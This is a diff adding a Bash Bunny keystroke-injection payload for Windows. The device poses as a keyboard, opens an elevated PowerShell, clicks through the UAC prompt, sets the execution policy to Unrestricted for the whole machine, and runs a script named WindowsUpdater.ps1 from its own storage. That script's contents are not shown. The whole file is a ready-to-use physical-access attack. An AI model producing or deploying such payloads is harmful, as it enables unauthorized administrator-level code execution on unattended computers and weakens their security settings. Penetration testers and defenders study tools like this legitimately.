@@ -1,0 +1,53 @@
+#!/bin/bash
+# Bash Bunny Payload to open an elevated PowerShell session, execute a script, and eject itself
+
+ATTACKMODE STORAGE HID
+
+# Allow time for Windows to recognize the device
+sleep 7
+
+# Open Run dialog (Win + r)
+QUACK WINDOWS r
+sleep 1
+
+# Type PowerShell
+QUACK STRING powershell
+sleep 0.8
+
+# Run PowerShell as administrator
+QUACK CTRL-SHIFT ENTER
+sleep 2
+
+# Approve UAC prompt (if required)
+QUACK ALT y
+sleep 8
+
+# Disable script execution policy for the session
+QUACK ENTER
+sleep 2
+QUACK ENTER
+QUACK ENTER
+sleep 4
+QUACK ENTER
+QUACK STRING Set-ExecutionPolicy Unrestricted -Scope LocalMachine -Force
+QUACK ENTER
+sleep 7
+
+# Navigate to Bash Bunny storage
+QUACK STRING cd D:
+QUACK ENTER
+QUACK STRING cd payloads
+QUACK ENTER
+QUACK STRING cd switch1
+QUACK ENTER
+sleep 1
+
+# Execute the PowerShell script stored on the Bash Bunny
+QUACK STRING ./WindowsUpdater.ps1
+QUACK ENTER
+
+# Wait for the script to complete
+sleep 15
+# Exit PowerShell session
+QUACK STRING exit
+QUACK ENTER
